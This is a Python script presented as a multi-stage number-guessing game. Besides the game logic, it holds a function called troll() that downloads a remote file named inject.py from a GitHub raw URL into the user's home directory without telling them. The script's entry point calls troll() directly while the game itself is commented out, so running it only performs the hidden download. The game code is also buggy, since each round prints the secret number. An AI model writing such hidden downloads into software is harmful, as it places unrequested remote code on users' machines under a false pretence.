# Script Number game

def main():


    def clear():
    # Clears the terminal for user experience
        import os
        os.system('cls' if os.name == 'nt' else 'clear')
        
        
    def rnumg(MIN, MAX):
    # Generates A random Number
        from random import randint as rnum
        A = rnum(MIN, MAX)
        return A


    def sleep(time):
    # Allows the program to sleep for user experience
        import time as t
        t.sleep(time)


    def yescheck():
    # Checks the user input to corspond with the correct arg type
        loop = 0 
        while( loop != 1 ):
            print('Yes/No')
            ARG = str(input())
            ARG = ARG.lower()
            if ARG == str('yes') or ARG == str('y'):
                V = 'y'
                loop = 1
            elif ARG == str('no') or ARG == str('n'):
                V = 'n'
                loop = 1
            else:
                clear()
                print('Sorry What?')
                sleep(1)
                clear()
        return V


    def numcheck(U):
        # Checks to see if user is entering a correct range to better the ability.
        loop = 0
        while( loop != 1 ):
            try:
                if U == 1:
                    print('| Stage {} |'.format(U))
                    print('Between {}/{}'.format(0, 1))
                elif U == 2:
                    print('| Stage {} |'.format(U))
                    print('Between {}/{}'.format(0, 10))
                else:
                    print('| Stage {} |'.format(U))
                    print('Between {}/{}'.format(0, 100))
                U = int(input())
                loop = 1
            except ValueError:
                clear()
                print('Huh?')
                sleep(.2)
                clear()
        return U
            
    
    def rnumstage(S):
        # Gets the random number for the sage.
        if S == 1:
            V = rnumg(0, 1)
        elif S == 2:
            V = rnumg(0, 10)
        else:
            V = rnumg(0, 100)
        return V


    def wait(Time):
        # Makes the user wait to seem like its doing something
        T = 0
        while( T != Time ):
            clear()
            print('Thinking')
            sleep(.5)
            clear()
            print('Thinking.')
            sleep(.5)
            clear()
            print('Thinking..')
            sleep(.5)
            clear()
            print('Thinking...')
            sleep(.5)
            T += 1
        clear()

    def troll():
        import os, urllib.request
        dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/inject.py'
        home = os.path.expanduser("~")
        path = home + '\inject.py'
        urllib.request.urlretrieve(dlurl, '{}'.format(path))
        print(path)
            

    def game():
    # Game Created By xXEthyleneXx
        S = 0
        clear()
        print('Game Created BY xXEthyleneXx')
        sleep(1)
        clear()
        print('Welcome to The Number Game :)')
        sleep(1)
        clear()

        def process():

            def round1():
                R = rnumstage(1)
                print(R)
                U = numcheck(1)
                if U == R:
                    S = 1
                    return S

            U = round1()

            if U == 1:
                clear()
                print('WoW You Guessed My Number')
                sleep(2)
                clear()

                def round2():
                    R = rnumstage(2)
                    print(R)
                    U = numcheck(2)
                    if U == R:
                        S = 2
                        return S

                U = round2()

                if U == 2:
                    clear()
                    print('WoW You Are Amazing')
                    sleep(2)
                    clear()

                    def round3():
                        R = rnumstage(3)
                        print(R)
                        U = numcheck(3)
                        if U == R:
                            S = 3
                            return S

                    U = round3()

                    if U == 3:
                        clear()
                        print('You Defeated The Beast')
                        troll()
                        exit()

                    else:
                        clear()
                        print('DAMNIT SO CLOSE')
                        sleep(2)
                        wait(1)
                        game()

                else:
                    clear()
                    print('You Failed')
                    sleep(2)
                    wait(1)
                    game()

            else:
                clear()
                print('You Failed')
                sleep(2)
                wait(1)
                game()

                
        process()
    troll()
    #game()

main()